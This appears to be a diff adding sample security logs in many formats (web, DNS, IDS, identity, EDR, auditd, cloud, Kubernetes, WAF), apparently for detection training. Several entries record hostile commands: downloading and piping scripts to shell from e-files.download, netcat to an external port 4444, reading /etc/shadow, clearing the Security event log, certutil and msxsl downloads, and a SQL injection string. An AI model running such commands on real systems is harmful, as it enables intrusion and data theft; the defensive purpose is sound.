@@ -1,0 +1,381 @@
+type 1:
+2024-09-02 04:57:15 +0530 192.168.182.199 GET /page/36 500 4996 9301 Internet Explorer (compatible,Suricata Malware user-agent rules,Malware,Malware,https://raw.githubusercontent.com/seanlinmt/suricata/master/files/rules/emerging-malware.rules,high,low,medium,Detection rule,network flow direction internal --> external simplepooltips.com
+2024-11-15 02:12:06 +0530 192.168.1.174 GET /page/20 500 3487 3000 aws-sdk-go/1.4.10 (go1.8.3; linux; amd64),static User agent used by PACU AWS exploitation Framework - can also be used by legit tools,PACU,Exploitation tool,https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/user_agents.txt,high,low,high,Detection rule,network flow direction internal/external --> external/Internal syvertsen-da.no
+2024-09-07 23:11:40 +0530 192.168.80.252 GET /page/71 500 1297 1215 Clever Internet Suite,Suricata suspicious user-agent rules,_,suspicious string,https://raw.githubusercontent.com/vncloudsco/suricata-rules/main/emerging-user_agents.rules,high,low,medium,Detection rule,network flow direction internal --> external bestfortraders.com
+2024-04-06 23:51:45 +0530 192.168.39.202 DELETE /page/33 404 4522 1958 MSIECrawler,crawlers / bad robots / suspicious spiders / junk web-scrapers / malicious spammersResource Development,Bots & Vulnerability Scanner,Bots & Vulnerability Scanner,https://raw.githubusercontent.com/mitchellkrogza/nginx-ultimate-bad-bot-blocker/master/_generator_lists/bad-user-agents.list,medium,low,medium,Detection rule,network flow direction internal --> external bscodecs.com
+2024-04-13 04:25:49 +0530 192.168.182.36 PUT /page/55 200 3111 7612 FemtosearchBot,crawlers / bad robots / suspicious spiders / junk web-scrapers / malicious spammersResource Development,Bots & Vulnerability Scanner,Bots & Vulnerability Scanner,https://raw.githubusercontent.com/mitchellkrogza/nginx-ultimate-bad-bot-blocker/master/_generator_lists/bad-user-agents.list,medium,low,medium,Detection rule,network flow direction internal --> external slavkokacunko.de
+
+type 2:
+
+45.161.33.88 - - [08/Sep/2021:18:46:06 +0000] "GET /contact HTTP/1.1" 404 2545 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML"
+64.188.21.227 - - [07/Jun/2021:07:50:36 +0000] "PUT /login HTTP/1.1" 500 3094 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML"
+84.32.190.72 - - [20/Jul/2021:07:24:05 +0000] "GET /contact HTTP/1.1" 301 3171 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
+103.226.155.118 - - [14/Feb/2020:01:10:45 +0000] "PUT /index.html HTTP/1.1" 404 3394 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML"
+103.27.109.249 - - [24/Jan/2022:19:06:08 +0000] "DELETE /login HTTP/1.1" 500 2743 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML"
+
+
+type 3:
+
+2023-01-03 18:23:14,toshiko.aguas,WS-5187-SF,msxsl.exe,msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>:ads-name,82.156.232.124
+2023-01-01 02:45:30,james.shipp,WS-4349-NY,start,start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,77.73.133.73
+2023-01-04 11:52:25,jennifer.carson,WS-7858-SF,set,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr",87.193.135.123
+2023-01-01 19:22:47,kenneth.dorsey,WS-8143-DC,Update.exe,Update.exe --download [url to package],207.32.216.212
+2023-01-05 18:43:40,kerri.smith,WS-4173-FL,certutil.exe,certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,45.207.53.108
+
+
+type 4:
+
+2023-01-01 06:58:38,192.168.163.100,172.64.155.249,GET,/products,https://stackoverflow.com/,200,7469,4373,"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12B466 Safari/600.1.4",virginia.schleppenbach
+2023-01-02 22:40:12,192.168.234.21,13.107.246.68,GET,/,https://amazon.com/,500,12117,3054,Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko,william.brun
+2023-01-03 09:06:07,192.168.72.109,205.251.242.103,GET,/,https://microsoft.com/,200,7691,4564,"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SM-N910A Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",dale.hester
+2023-01-01 16:14:01,192.168.44.227,103.102.166.224,GET,/products,https://wikipedia.org/,304,9676,3263,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0; TNJB; 1ButtonTaskbar),rachel.hart
+2023-01-05 18:03:59,192.168.138.251,20.207.73.82,GET,/search,https://github.com/,200,17133,2561,"Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",harvey.seligman
+2023-01-04 20:14:22,192.168.188.226,20.207.73.82,GET,/products,https://microsoft.com/,304,15117,786,Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko,chase.charpia
+
+
+type 5:
+ID,Timestamp,Source_IP,Destination_Domain,Referrer,User_Agent,Bytes_Out,Label
+1,2025-11-01 00:00:00,192.168.1.10,github.com,google.com,Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0,41478,
+2,2025-11-01 00:00:03,192.168.1.85,microsoft.com,google.com,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0 Safari/537.36,47801,
+3,2025-11-01 00:00:09,192.168.1.139,google.com,google.com,Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0,31840,
+4,2025-11-01 00:00:14,192.168.1.166,aws.amazon.com,google.com,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0 Safari/537.36,44737,
+5,2025-11-01 00:00:19,192.168.1.175,e-files.download,media.vietnamflash.com,NetSpider,276616,
+6,2025-11-01 00:00:30,192.168.1.234,github.com,google.com,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0 Safari/537.36,33411,
+7,2025-11-01 00:00:41,192.168.1.127,aws.amazon.com,google.com,Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0,7937,
+8,2025-11-01 00:00:45,192.168.1.5,hkdust.github.wiki,google.com,Pavuk,264446,
+9,2025-11-01 00:00:57,192.168.1.170,itamaraty-gov.com,google.com,URLy\ Warning,411181,
+10,2025-11-01 00:01:01,192.168.1.188,aws.amazon.com,google.com,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/18.5 Safari/605.1.15,34865,
+----------------------------------------------------------------------------------------------------------------------------------------
+type 6:
+ID,Timestamp,Hostname,EventID,Description,Command,Label
+1,2025-11-01 00:00:13,NYC-SLS-L0534,4634,An account was logged off,N/A,
+2,2025-11-01 00:01:07,LON-FIN-L0090,4688,Process Created,C:\Program Files\Google\Chrome\chrome.exe,
+3,2025-11-01 00:02:35,SFO-HR-L0117,4688,Process Created,C:\Windows\System32\svchost.exe,
+4,2025-11-01 00:03:43,DESKTOP-4CS9LBX,4624,An account was successfully logged on,N/A,
+5,2025-11-01 00:04:48,LON-MKTG-L0005,4688,Process Created,C:\Program Files\Google\Chrome\chrome.exe,
+6,2025-11-01 00:06:33,NYC-HR-L0469,4688,Process Created,C:\Windows\System32\svchost.exe,
+7,2025-11-01 00:06:42,TKY-SLS-L0729,4624,An account was successfully logged on,N/A,
+8,2025-11-01 00:07:30,TKY-HR-L0659,4624,An account was successfully logged on,N/A,
+9,2025-11-01 00:07:45,LON-LEG-L0541,4634,An account was logged off,N/A,
+10,2025-11-01 00:07:48,NYC-ENG-L0333,4688,Process Created,C:\Windows\System32\svchost.exe,
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+type 7:
+
+ID,Date,Time,Description,IP Address,Host Name,MAC Address
+11,11/01/25,00:24:33,Renew,192.168.1.121,NYC-LEG-L0010,EB99931717C2
+11,11/01/25,02:33:41,Renew,192.168.1.194,TKY-MKTG-L0119,F6833F9CB099
+10,11/01/25,02:55:46,Assign,192.168.1.232,SFO-SLS-L0095,4D4507E87D38
+10,11/01/25,05:00:20,Assign,192.168.1.120,DESKTOP-KY4NGZ5,2734156F18F7
+10,11/01/25,06:29:17,Assign,192.168.1.176,DESKTOP-9IB1D63,18400671D617
+10,11/01/25,06:40:54,Assign,192.168.1.173,NYC-ENG-L0546,7A6001CCE268
+10,11/01/25,06:42:06,Assign,192.168.1.10,TKY-MKTG-L0305,5592F21082B4
+11,11/01/25,08:14:43,Renew,192.168.1.139,LON-ENG-L0509,0268A208387C
+11,11/01/25,08:38:23,Renew,192.168.1.223,SFO-HR-L0192,C688298B97FC
+10,11/01/25,08:41:07,Assign,192.168.1.252,TKY-HR-L0382,9E74EFC448D1
+11,11/01/25,08:47:12,Renew,192.168.1.39,SFO-MKTG-L0507,12798262C783
+11,11/01/25,09:10:55,Renew,192.168.1.196,DESKTOP-CBSRIPC,1EBA1272CDE8
+11,11/01/25,13:06:34,Renew,192.168.1.183,TKY-FIN-L0077,4273F359FB66
+10,11/01/25,13:34:29,Assign,192.168.1.248,TKY-HR-L0784,26A87EC84ED9
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+
+type 8:
+
+ID,Date,Time,Source_IP,Destination_IP,Action,Bytes_Out,Label
+1,2025-11-01,00:00:06,192.168.1.238,8.8.8.8,ALLOW,14082,
+2,2025-11-01,00:00:12,192.168.1.230,142.250.190.46,ALLOW,16109,
+3,2025-11-01,00:00:16,192.168.1.123,13.107.4.52,ALLOW,14170,
+4,2025-11-01,00:00:17,192.168.1.253,61.177.56.27,ALLOW,360440,
+5,2025-11-01,00:00:17,192.168.1.227,54.239.28.85,ALLOW,2412,
+6,2025-11-01,00:00:28,192.168.1.177,8.8.8.8,ALLOW,24198,
+7,2025-11-01,00:00:29,192.168.1.190,52.183.120.1,ALLOW,17162,
+8,2025-11-01,00:00:36,192.168.1.87,185.112.83.116,ALLOW,359884,
+9,2025-11-01,00:00:37,192.168.1.51,142.250.190.46,ALLOW,10476,
+10,2025-11-01,00:00:38,192.168.1.231,52.183.120.1,ALLOW,20555,
+11,2025-11-01,00:00:49,192.168.1.83,13.107.4.52,ALLOW,2496,
+12,2025-11-01,00:00:50,192.168.1.11,8.8.8.8,ALLOW,8106,
+13,2025-11-01,00:00:51,192.168.1.41,54.239.28.85,ALLOW,12027,
+14,2025-11-01,00:00:56,192.168.1.177,142.250.190.46,ALLOW,5335,
+15,2025-11-01,00:01:09,192.168.1.170,54.239.28.85,ALLOW,6502,
+16,2025-11-01,00:01:11,192.168.1.46,52.183.120.1,ALLOW,15925,
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+
+type 9:
+
+ID,Timestamp,Hostname,User,IP,EventID,LogonID,Action,Label
+1,2025-11-01 00:00:09,LON-SLS-L0388,LON-SLS-L0388,94.190.43.52,4624,0xe2afb0eb,LOGON,
+2,2025-11-01 00:00:10,LON-LEG-L0428,LON-LEG-L0428,208.81.37.55,4624,0xe0cdc07f,LOGON,
+3,2025-11-01 00:00:16,DESKTOP-J2YXE81,DESKTOP-J2YXE81,134.122.188.249,4624,0xf836bb0c,LOGON,
+4,2025-11-01 00:00:54,NYC-FIN-L0524,NYC-FIN-L0524,185.227.70.204,4624,0x0cbeb6c0,LOGON,
+5,2025-11-01 00:01:06,NYC-LEG-L0529,NYC-LEG-L0529,43.131.69.98,4624,0xcef212db,LOGON,
+238,2025-11-01 00:40:09,LON-SLS-L0388,LON-SLS-L0388,94.190.43.52,4634,0xe2afb0eb,LOGOFF,
+705,2025-11-01 01:37:10,LON-LEG-L0428,LON-LEG-L0428,208.81.37.55,4634,0xe0cdc07f,LOGOFF,
+536,2025-11-01 01:15:16,DESKTOP-J2YXE81,DESKTOP-J2YXE81,134.122.188.249,4634,0xf836bb0c,LOGOFF,
+75,2025-11-01 00:12:54,NYC-FIN-L0524,NYC-FIN-L0524,185.227.70.204,4634,0x0cbeb6c0,LOGOFF,
+252,2025-11-01 00:43:06,NYC-LEG-L0529,NYC-LEG-L0529,43.131.69.98,4634,0xcef212db,LOGOFF,
+
+
+
+
+
+
+
+
+) Network Telemetry (5 families × 5 lines)
+# 1. DNS Resolver Logs
+2025-11-01T00:00:12Z dns client=192.168.1.85 qname=itamaraty-gov.com qtype=A rcode=NOERROR answer=43.131.69.98 ttl=60
+2025-11-01T00:00:19Z dns client=192.168.1.175 qname=e-files.download qtype=A rcode=NOERROR answer=185.112.83.116 ttl=120
+2025-11-01T00:00:29Z dns client=192.168.1.190 qname=hkdust.github.wiki qtype=AAAA rcode=NOERROR answer=2606:50c0:: ttl=300
+2025-11-01T00:00:41Z dns client=192.168.1.127 qname=cdn-update-check.net qtype=TXT rcode=NOERROR answer="v=ok;id=93" ttl=30
+2025-11-01T00:00:57Z dns client=192.168.1.170 qname=7xq2k9d1k3.biz qtype=A rcode=NXDOMAIN answer=- ttl=0
+
+# 2. NetFlow / IPFIX Flow Records
+2025-11-01T00:00:17Z flow src=192.168.1.253:49822 dst=61.177.56.27:443 proto=TCP bytes_out=360440 bytes_in=2412 pkts=312 dur=42s
+2025-11-01T00:00:36Z flow src=192.168.1.87:51310 dst=185.112.83.116:443 proto=TCP bytes_out=359884 bytes_in=5141 pkts=289 dur=38s
+2025-11-01T00:00:49Z flow src=192.168.1.83:53544 dst=13.107.4.52:443 proto=TCP bytes_out=2496 bytes_in=11822 pkts=41 dur=7s
+2025-11-01T00:01:01Z flow src=192.168.1.10:61622 dst=52.183.120.1:443 proto=TCP bytes_out=15925 bytes_in=20555 pkts=88 dur=15s
+2025-11-01T00:01:11Z flow src=192.168.1.46:62301 dst=52.183.120.1:443 proto=TCP bytes_out=15925 bytes_in=20555 pkts=91 dur=16s
+
+# 3. IDS/IPS Alert Logs (Suricata/Snort-style)
+2025-11-01T00:00:28Z ids alert="ET MALWARE Possible C2" severity=2 src=192.168.1.177 dst=185.112.83.116 proto=TCP
+2025-11-01T00:00:45Z ids alert="ET TROJAN Downloader" severity=1 src=192.168.1.175 dst=185.112.83.116 proto=HTTP
+2025-11-01T00:00:56Z ids alert="GPL ATTACK SQLi Attempt" severity=2 src=94.190.43.52 dst=10.10.10.20 proto=HTTP
+2025-11-01T00:01:09Z ids alert="ET SCAN Nmap Scripting Engine" severity=3 src=208.81.37.55 dst=10.10.10.20 proto=TCP
+2025-11-01T00:01:15Z ids alert="ET POLICY Suspicious TLS SNI" severity=3 src=192.168.1.170 dst=61.177.56.27 proto=TLS sni=cdn-update-check.net
+
+# 4. Zeek Conn Logs (NDR connection summaries)
+2025-11-01T00:00:17Z zeek_conn uid=C1 orig=192.168.1.253:49822 resp=61.177.56.27:443 proto=tcp service=ssl dur=42.0 orig_bytes=360440 resp_bytes=2412 state=S1
+2025-11-01T00:00:36Z zeek_conn uid=C2 orig=192.168.1.87:51310 resp=185.112.83.116:443 proto=tcp service=ssl dur=38.1 orig_bytes=359884 resp_bytes=5141 state=S1
+2025-11-01T00:00:49Z zeek_conn uid=C3 orig=192.168.1.83:53544 resp=13.107.4.52:443 proto=tcp service=ssl dur=7.2 orig_bytes=2496 resp_bytes=11822 state=S1
+2025-11-01T00:01:06Z zeek_conn uid=C4 orig=192.168.1.10:61622 resp=52.183.120.1:443 proto=tcp service=ssl dur=15.4 orig_bytes=15925 resp_bytes=20555 state=S1
+2025-11-01T00:01:11Z zeek_conn uid=C5 orig=192.168.1.170:62111 resp=7.7.7.7:53 proto=udp service=dns dur=0.1 orig_bytes=84 resp_bytes=196 state=SF
+
+# 5. TLS/SSL Handshake Logs (Zeek ssl / JA3-like telemetry)
+2025-11-01T00:00:17Z tls src=192.168.1.253 dst=61.177.56.27 sni=cdn-update-check.net ja3=771,4865-4866,0-11-10,29-23,0 cert_sha1=AB:CD:...
+2025-11-01T00:00:36Z tls src=192.168.1.87 dst=185.112.83.116 sni=e-files.download ja3=771,49195-49196,0-11-10,29-23,0 cert_sha1=11:22:...
+2025-11-01T00:00:49Z tls src=192.168.1.83 dst=13.107.4.52 sni=login.microsoftonline.com ja3=771,4865-4866,0-11-10,29-23,0 cert_sha1=33:44:...
+2025-11-01T00:01:01Z tls src=192.168.1.10 dst=52.183.120.1 sni=api.github.com ja3=771,4865-4866,0-11-10,29-23,0 cert_sha1=55:66:...
+2025-11-01T00:01:09Z tls src=192.168.1.170 dst=61.177.56.27 sni=7xq2k9d1k3.biz ja3=771,49195-49196,0-11-10,29-23,0 cert_sha1=77:88:...
+
+2) Identity & Access (5 families × 5 lines)
+# 6. SSO / IdP Sign-in Logs (Okta/AzureAD/Google Workspace)
+2025-11-01T00:00:10Z idp user=william.brun app=Office365 result=SUCCESS ip=208.81.37.55 device=Win10 mfa=PASS risk=MED
+2025-11-01T00:00:16Z idp user=jennifer.carson app=GitHub result=FAIL ip=94.190.43.52 device=Unknown mfa=NOT_SENT risk=HIGH
+2025-11-01T00:00:54Z idp user=harvey.seligman app=AWSConsole result=SUCCESS ip=185.227.70.204 device=MacOS mfa=PASS risk=HIGH
+2025-11-01T00:01:06Z idp user=rachel.hart app=Slack result=SUCCESS ip=43.131.69.98 device=Android mfa=PASS risk=LOW
+2025-11-01T00:01:15Z idp user=kenneth.dorsey app=VPNPortal result=FAIL ip=77.73.133.73 device=Win11 mfa=FAIL risk=HIGH
+
+# 7. Active Directory Auth Logs (Kerberos/NTLM summaries)
+2025-11-01T00:00:12Z ad_auth user=james.shipp auth=Kerberos action=TGT_REQUEST result=SUCCESS src_ip=192.168.1.85 dc=DC01
+2025-11-01T00:00:19Z ad_auth user=james.shipp auth=NTLM action=LOGON result=FAIL src_ip=94.190.43.52 workstation=WS-4349-NY
+2025-11-01T00:00:41Z ad_auth user=svc_backup auth=Kerberos action=SERVICE_TICKET result=SUCCESS src_ip=192.168.1.10 svc=cifs/FILE01
+2025-11-01T00:00:57Z ad_auth user=william.brun auth=Kerberos action=TGT_REQUEST result=SUCCESS src_ip=43.131.69.98 dc=DC02
+2025-11-01T00:01:09Z ad_auth user=admin1 auth=Kerberos action=TGT_REQUEST result=SUCCESS src_ip=185.227.70.204 dc=DC01 anomaly=NEW_GEO
+
+# 8. PAM Logs (Privileged Access / Session Recording)
+2025-11-01T00:00:36Z pam requester=chase.charpia account=DomainAdmin1 action=CHECKOUT result=APPROVED ticket=INC-1042
+2025-11-01T00:00:49Z pam session=sessionA target=DC01 action=START requester=chase.charpia protocol=RDP
+2025-11-01T00:00:56Z pam session=sessionA action=COMMAND cmd="net group 'Domain Admins' /domain" risk=HIGH
+2025-11-01T00:01:01Z pam session=sessionA action=COMMAND cmd="wevtutil cl Security" risk=CRITICAL
+2025-11-01T00:01:11Z pam session=sessionA action=END duration=00:10:22 export=RECORDED
+
+# 9. RADIUS/TACACS AAA Logs (Network device/admin auth)
+2025-11-01T00:00:06Z aaa proto=RADIUS device=core-sw1 user=netadmin1 action=LOGIN result=ACCEPT src_ip=192.168.1.121
+2025-11-01T00:00:17Z aaa proto=TACACS device=fw-mgmt1 user=netadmin2 action=ENABLE result=ACCEPT src_ip=192.168.1.194
+2025-11-01T00:00:28Z aaa proto=RADIUS device=vpn-gw1 user=rachel.hart action=VPN_AUTH result=REJECT src_ip=77.73.133.73
+2025-11-01T00:00:38Z aaa proto=TACACS device=router1 user=admin1 action=CONFIG_MODE result=ACCEPT src_ip=185.227.70.204
+2025-11-01T00:00:50Z aaa proto=RADIUS device=wifi-ctrl1 user=guest1 action=8021X result=ACCEPT src_ip=192.168.1.232
+
+# 10. MFA Provider Logs (Duo / Authenticator events)
+2025-11-01T00:00:10Z mfa user=william.brun method=PUSH result=APPROVE ip=208.81.37.55 device=iPhone
+2025-11-01T00:00:16Z mfa user=jennifer.carson method=PUSH result=DENY ip=94.190.43.52 device=Android reason=UNEXPECTED
+2025-11-01T00:00:54Z mfa user=harvey.seligman method=OTP result=PASS ip=185.227.70.204 device=MacOS
+2025-11-01T00:01:06Z mfa user=rachel.hart method=PUSH result=APPROVE ip=43.131.69.98 device=Android
+2025-11-01T00:01:15Z mfa user=kenneth.dorsey method=PUSH result=TIMEOUT ip=77.73.133.73 device=Win11
+
+3) Endpoint Telemetry (5 families × 5 lines)
+# 11. EDR Detection/Telemetry (CrowdStrike/S1/Defender for Endpoint style)
+2025-11-01T00:00:49Z edr host=NYC-ENG-L0333 user=william.brun verdict=Malicious tactic=Execution technique=T1059 proc=powershell.exe
+2025-11-01T00:00:56Z edr host=WS-5187-SF user=toshiko.aguas verdict=Suspicious tactic=DefenseEvasion proc=msxsl.exe
+2025-11-01T00:01:01Z edr host=DESKTOP-4CS9LBX user=harvey.seligman verdict=Suspicious tactic=Persistence proc=reg.exe
+2025-11-01T00:01:09Z edr host=TKY-HR-L0659 user=rachel.hart verdict=Malicious tactic=CredentialAccess proc=lsass_dump.exe
+2025-11-01T00:01:11Z edr host=LON-FIN-L0090 user=james.shipp verdict=Benign proc=chrome.exe
+
+# 12. Linux Auth Logs (sshd/sudo)
+Nov  1 00:01:06 ubuntu1 sshd[2219]: Failed password for root from 208.81.37.55 port 53321 ssh2
+Nov  1 00:01:10 ubuntu1 sshd[2219]: Accepted publickey for deploy from 43.131.69.98 port 61233 ssh2
+Nov  1 00:01:15 ubuntu1 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Nov  1 00:01:19 ubuntu1 sudo: pam_unix(sudo:auth): authentication failure for deploy from pts/1
+Nov  1 00:01:22 ubuntu1 sshd[2219]: Disconnecting: Too many authentication failures for invalid user
+
+# 13. Linux auditd Logs (process/file auditing)
+type=EXECVE msg=audit(1730419272.123:101): argc=3 a0="curl" a1="-fsSL" a2="http://e-files.download/p.sh"
+type=EXECVE msg=audit(1730419276.411:102): argc=2 a0="bash" a1="/tmp/p.sh"
+type=SYSCALL msg=audit(1730419281.077:103): arch=c000003e syscall=2 success=yes exe="/usr/bin/ssh" comm="ssh"
+type=EXECVE msg=audit(1730419289.305:104): argc=4 a0="tar" a1="-czf" a2="/tmp/db.tgz" a3="/var/lib/postgresql"
+type=EXECVE msg=audit(1730419295.990:105): argc=3 a0="nc" a1="61.177.56.27" a2="4444"
+
+# 14. macOS EndpointSecurity / Unified Logs (security-relevant events)
+2025-11-01T00:00:12Z mac_es host=MAC-HR-01 user=harvey.seligman event=PROC_EXEC path="/bin/zsh" parent="/usr/libexec/login"
+2025-11-01T00:00:19Z mac_es host=MAC-HR-01 user=harvey.seligman event=PROC_EXEC path="/usr/bin/curl" args="http://7xq2k9d1k3.biz/a"
+2025-11-01T00:00:28Z mac_es host=MAC-HR-01 user=harvey.seligman event=FILE_WRITE path="/Users/.../LaunchAgents/com.update.plist"
+2025-11-01T00:00:36Z mac_es host=MAC-HR-01 user=harvey.seligman event=NET_CONNECT dst=185.112.83.116:443 proc="/usr/bin/python3"
+2025-11-01T00:00:45Z mac_es host=MAC-HR-01 user=harvey.seligman event=KEXT_LOAD name="suspicious.kext" result=BLOCKED
+
+# 15. File Integrity Monitoring (FIM) Logs
+2025-11-01T00:00:06Z fim host=FILE01 path="/etc/ssh/sshd_config" action=MODIFY hash_old=... hash_new=... user=root
+2025-11-01T00:00:12Z fim host=WEB01 path="/var/www/html/login.php" action=MODIFY hash_old=... hash_new=... user=www-data
+2025-11-01T00:00:19Z fim host=DB01 path="/var/lib/postgresql/pg_hba.conf" action=MODIFY hash_old=... hash_new=... user=postgres
+2025-11-01T00:00:28Z fim host=DC01 path="C:\Windows\System32\drivers\etc\hosts" action=MODIFY user=SYSTEM
+2025-11-01T00:00:36Z fim host=WEB01 path="/usr/bin/ssh" action=MODIFY hash_old=... hash_new=... user=root anomaly=RARE
+
+4) Cloud + Containers (5 families × 5 lines)
+# 16. Cloud Control Plane Audit (CloudTrail/Azure Activity/GCP Audit)
+2025-11-01T00:02:35Z cloud_audit provider=AWS event=CreateAccessKey principal=jennifer.carson src_ip=77.73.133.73 region=us-east-1 outcome=Success
+2025-11-01T00:03:12Z cloud_audit provider=AWS event=PutBucketPolicy principal=admin1 src_ip=185.227.70.204 region=us-east-1 outcome=Success
+2025-11-01T00:03:43Z cloud_audit provider=Azure op=Microsoft.KeyVault/vaults/secrets/read caller=harvey.seligman ip=43.131.69.98 outcome=Success
+2025-11-01T00:04:01Z cloud_audit provider=GCP method=storage.objects.get principal=rachel.hart ip=208.81.37.55 outcome=Denied
+2025-11-01T00:04:48Z cloud_audit provider=AWS event=StopLogging principal=admin1 src_ip=185.227.70.204 region=us-east-1 outcome=Success
+
+# 17. Cloud Network Flow Logs (VPC Flow / NSG Flow)
+2025-11-01T00:00:36Z cloud_flow src=10.0.2.15:54122 dst=52.183.120.1:443 proto=TCP action=ACCEPT bytes=20555
+2025-11-01T00:00:49Z cloud_flow src=10.0.2.15:54124 dst=13.107.4.52:443 proto=TCP action=ACCEPT bytes=11822
+2025-11-01T00:01:06Z cloud_flow src=10.0.1.10:60211 dst=61.177.56.27:443 proto=TCP action=ACCEPT bytes=411181
+2025-11-01T00:01:11Z cloud_flow src=10.0.1.10:60211 dst=61.177.56.27:4444 proto=TCP action=REJECT bytes=0
+2025-11-01T00:01:15Z cloud_flow src=10.0.9.9:53000 dst=8.8.8.8:53 proto=UDP action=ACCEPT bytes=196
+
+# 18. Kubernetes Audit Logs (kube-apiserver)
+2025-11-01T00:00:10Z k8s_audit user=system:serviceaccount:default:app verb=get resource=secrets ns=prod obj=db-creds decision=allow
+2025-11-01T00:00:16Z k8s_audit user=james.shipp verb=create resource=pods ns=prod obj=debug-shell decision=allow
+2025-11-01T00:00:28Z k8s_audit user=james.shipp verb=exec resource=pods ns=prod obj=api-7c8 decision=allow cmd="/bin/sh"
+2025-11-01T00:00:45Z k8s_audit user=admin1 verb=patch resource=clusterrolebindings obj=cluster-admin decision=allow
+2025-11-01T00:01:01Z k8s_audit user=unknown verb=list resource=secrets ns=prod decision=forbid reason=RBAC_DENY
+
+# 19. Container Runtime Logs (containerd / Docker daemon)
+2025-11-01T00:00:06Z containerd event=container_start id=ab12 image=nginx:1.27 host=node-1
+2025-11-01T00:00:12Z containerd event=container_exec id=ab12 cmd="bash -c curl http://e-files.download/p.sh | sh"
+2025-11-01T00:00:19Z containerd event=image_pull image=unknown/rev:latest result=SUCCESS registry=public
+2025-11-01T00:00:28Z docker event=container_kill id=ab12 signal=9 reason=oom
+2025-11-01T00:00:36Z docker event=privileged_container id=cc34 image=alpine:latest flag=privileged=true
+
+# 20. Secrets / KMS Audit (Decrypt/GetSecretValue)
+2025-11-01T00:00:49Z secrets provider=AWS action=GetSecretValue principal=svc_app src_ip=10.0.2.15 secret=prod/db/password outcome=Success
+2025-11-01T00:00:56Z kms provider=AWS action=Decrypt principal=svc_app src_ip=10.0.2.15 key=arn:kms:... outcome=Success
+2025-11-01T00:01:01Z secrets provider=AzureKV action=SecretGet principal=admin1 ip=185.227.70.204 secret=prod-token outcome=Success
+2025-11-01T00:01:09Z kms provider=GCP action=Decrypt principal=rachel.hart ip=208.81.37.55 key=projects/... outcome=Denied
+2025-11-01T00:01:15Z secrets provider=AWS action=GetSecretValue principal=admin1 src_ip=185.227.70.204 secret=prod/master-key outcome=Success anomaly=RARE
+
+5) App + API Layer (5 families × 5 lines)
+# 21. WAF Logs (Cloudflare/AWS WAF/Imperva)
+2025-11-01T00:00:10Z waf action=BLOCK client_ip=94.190.43.52 method=GET uri="/login?u=' OR 1=1--" rule=SQLI score=98
+2025-11-01T00:00:16Z waf action=CHALLENGE client_ip=208.81.37.55 method=GET uri="/wp-admin/" rule=BOT score=72
+2025-11-01T00:00:28Z waf action=BLOCK client_ip=134.122.188.249 method=POST uri="/api/upload" rule=RCE score=93
+2025-11-01T00:00:45Z waf action=ALLOW client_ip=43.131.69.98 method=GET uri="/products" rule=- score=5
+2025-11-01T00:00:56Z waf action=BLOCK client_ip=185.227.70.204 method=GET uri="/.env" rule=PATH_TRAVERSAL score=91
+
+# 22. API Gateway Access Logs (Kong / Apigee / AWS API GW)
+2025-11-01T00:00:12Z apigw client_ip=43.131.69.98 method=GET path="/v1/users" status=200 latency_ms=32 key_id=key-12
+2025-11-01T00:00:19Z apigw client_ip=94.190.43.52 method=POST path="/v1/auth" status=401 latency_ms=18 key_id=none
+2025-11-01T00:00:28Z apigw client_ip=208.81.37.55 method=GET path="/v1/admin" status=403 latency_ms=21 key_id=key-77
+2025-11-01T00:00:36Z apigw client_ip=185.227.70.204 method=GET path="/v1/export" status=200 latency_ms=410 key_id=key-99 bytes_out=411181
+2025-11-01T00:00:49Z apigw client_ip=185.227.70.204 method=GET path="/v1/export" status=429 latency_ms=3 key_id=key-99 rate_limited=true
+
+# 23. Load Balancer Access Logs (ALB/NGINX/Envoy LB-style)
+2025-11-01T00:00:10Z lb client=43.131.69.98:51221 target=10.0.2.15:8080 req="GET /products" status=200 sent=7469 ua="Safari"
+2025-11-01T00:00:16Z lb client=94.190.43.52:53321 target=10.0.2.15:8080 req="GET /.env" status=404 sent=512 ua="curl"
+2025-11-01T00:00:28Z lb client=208.81.37.55:61233 target=10.0.2.16:8080 req="POST /login" status=500 sent=3094 ua="Mozilla"
